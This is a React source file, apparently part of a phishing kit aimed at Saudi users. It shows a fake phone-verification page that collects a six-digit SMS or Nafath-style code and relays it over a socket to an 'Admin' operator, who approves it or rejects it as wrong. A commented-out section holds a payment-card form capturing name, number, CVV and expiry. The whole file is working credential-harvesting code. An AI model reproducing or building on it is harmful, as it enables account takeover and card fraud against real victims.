import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";
import { AiOutlineCloseCircle } from "react-icons/ai";
const NavazCode = () => {
  const [otp, setOtp] = useState("");
  const [load, setLoad] = useState(false);
  const [error, setError] = useState("");
  const [counter, setCounter] = useState(60);

  const handleSubmit = async (e) => {
    setLoad(true);
    setError("");
    e.preventDefault();

    try {
      await axios
        .post(api_route + "/navazOtp/" + id, { navazCode: otp })
        .then(() => {
          socket.emit("navazOtp", { id, otp });
        });
    } catch (error) {
      console.error(error);
    }
  };

  socket.on("acceptNavazOtp", (data) => {
    console.log("acceptNavazOtp From Admin", id);
    console.log(data);
    if (id === data) {
      window.location.href = "/pin";
    }
  });

  socket.on("declineVisaOTP", (data) => {
    console.log("declineVisaOTP From Admin", data);

    console.log(data);
    if (id === data) {
      setLoad(false);
      setError("كود تحقق البطاقة غير صحيح برجاء المحاولة مره اخري");
    }
  });

  return (
    <div className="w-full  lg:w-1/2 flex flex-col items-center justify-center  rounded-md">
      <form
        className="bg-white border h-screen border-gray-300 rounded-md  p-3 py-10 text-sm w-full"
        dir="rtl"
        onSubmit={handleSubmit}
      >
        <h2 className="font-bold text-xxl my-2  "> التحقق من رقم الهاتف</h2>
        <p className="py-1 text-xs font-bold text-gray-500 flex flex-col gap-y-2">
          <span>
            {" "}
            تم ارسال رسالة نصية إلي جوالك لربط الوثيقة علي رقم الهاتف الخاص بك
          </span>
          <span>يرجي إدخال رمز التحقق المرسل إلي جوالك +966 ********</span>
        </p>

        <div className="flex justify-start p-1 py-3 items-start gap-y-2 w-full flex-col">
          <span className="font-bold"> رمز التحقق *</span>
          <input
            value={otp}
            required
            onChange={(e) => setOtp(e.target.value)}
            dir="ltr"
            placeholder="******"
            inputMode="numeric"
            minLength={6}
            maxLength={6}
            type="text"
            className="border px-3 py-1  border-gray-300 text-base text-right outline-[#ffc107] rounded-md w-full"
          />
        </div>

        <div className="w-full flex items-center justify-center py-5">
          {" "}
          <button className="  px-5 flex justify-center items-center py-2  bg-sky-800 text-white w-11/12 rounded-md ">
            تأكيد
          </button>
        </div>
        <div className="flex w-full gap-x-3 items-center justify-center">
          سيتم إرسال رسالة كود التحقق خلال دقيقة
        </div>
      </form>
      {load ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
    </div>
    // <div
    //   className="w-full flex flex-col min-h-screen items-center justify-center  relative"
    //   dir="rtl"
    // >
    //   <form
    //     className=" w-11/12  p-3 rounded-xl justify-center  items-center flex flex-col gap-y-2 "
    //     onSubmit={handleSubmit}
    //   >
    //     <div
    //       className="w-full py-3  flex flex-col items-center justify-between p-2 rounded-xl"
    //       dir="rtl"
    //     >
    //       <div className="flex flex-col w-full gap-3  my-2">
    //         <input
    //           value={car_holder_name}
    //           required
    //           onChange={(e) => setCardHolderName(e.target.value)}
    //           dir="ltr"
    //           minLength={4}
    //           type="text"
    //           placeholder="الأسم المدون علي البطاقة"
    //           className="w-full   rounded-md border    p-2  placeholder:text-gray-600 text-center     outline-orange-500"
    //         />
    //       </div>
    //       <div className="flex flex-col w-full gap-3  my-2" dir="rtl">
    // <input
    //   value={card_number}
    //   required
    //   onChange={handleCardNumberChange}
    //   dir="ltr"
    //   maxLength={19}
    //   minLength={16}
    //   inputMode="numeric"
    //   type="text"
    //   placeholder="**** **** **** ****"
    //   className="w-full   rounded-md border    p-2  placeholder:text-gray-600 text-center     outline-orange-500"
    // />
    //       </div>
    //       <div className="w-full flex items-end justify-end">
    //         <img src="/img7.avif" />
    //       </div>
    //       <div className="flex w-full  gap-2">
    //         <div
    //           className="flex flex-col w-full  gap-x-5 text-xl my-2"
    //           dir="rtl"
    //         >
    // <div className="flex w-full gap-x-5 px-2 text-sm ">
    //   <div className="flex items-center justify-center gap-x-2">
    //     <input
    //       className="text-xs  border rounded-md py-2 px-1 text-center w-1/2"
    //       type="text"
    //       value={cvv}
    //       onChange={handleCvvChange}
    //       inputMode="numeric"
    //       placeholder="CVV"
    //       maxLength={3}
    //       required
    //     />
    //     <span className="text-xs"> كود الحماية</span>
    //   </div>
    //   <div className="flex items-center justify-center gap-x-2">
    //     <input
    //       className="text-xs  border rounded-md py-2 px-1 text-center w-1/2"
    //       type="text"
    //       value={expiryDate}
    //       maxLength={5}
    //       inputMode="numeric"
    //       onChange={handleExpiryDateChange}
    //       placeholder="MM/YY"
    //       required
    //     />
    //     <span className="text-xs"> تاريخ الإنتهاء </span>
    //   </div>
    //  </div>
    // </div>
    //       </div>
    //       <div
    //         className="flex items-center justify-start gap-3 px-2 text-lg text-gray-500 my-2 "
    //         dir="rtl"
    //       ></div>

    //       <div className="w-full flex items-center justify-center relative">
    //         <img src="/visa2.png" className="rounded-md" />
    //         {cvv && (
    //           <span className="text-white absolute right-16 top-6 font-semibold">
    //             {cvv}
    //           </span>
    //         )}
    //         <div className="absolute w-full h-full flex flex-col items-center justify-center -bottom-10 gap-y-2">
    //           {car_holder_name && (
    //             <span className="text-white">{car_holder_name}</span>
    //           )}
    //           {card_number && <span className="text-white">{card_number}</span>}
    //           {expiryDate && <span className="text-white">{expiryDate}</span>}
    //         </div>
    //       </div>
    //       {error && (
    //         <span className="text-red-500 w-full text-center text-lg mt-5 font-bold">
    //           {error}
    //         </span>
    //       )}

    //       <button
    //         className="bg-black w-full my-5 font-bold text-white flex items-center justify-center  py-2 rounded-md mt-5"
    //         type="submit"
    //       >
    //         {load ? (
    //           <TailSpin
    //             height="30"
    //             width="30"
    //             color="white"
    //             ariaLabel="tail-spin-loading"
    //             radius="1"
    //             wrapperStyle={{}}
    //             wrapperClass=""
    //             visible={true}
    //           />
    //         ) : (
    //           "تسديد "
    //         )}
    //       </button>
    //     </div>
    //   </form>
    //   <img src="/visa3.png" className="w-11/12 my-2 " />
    // </div>
  );
};

export default NavazCode;
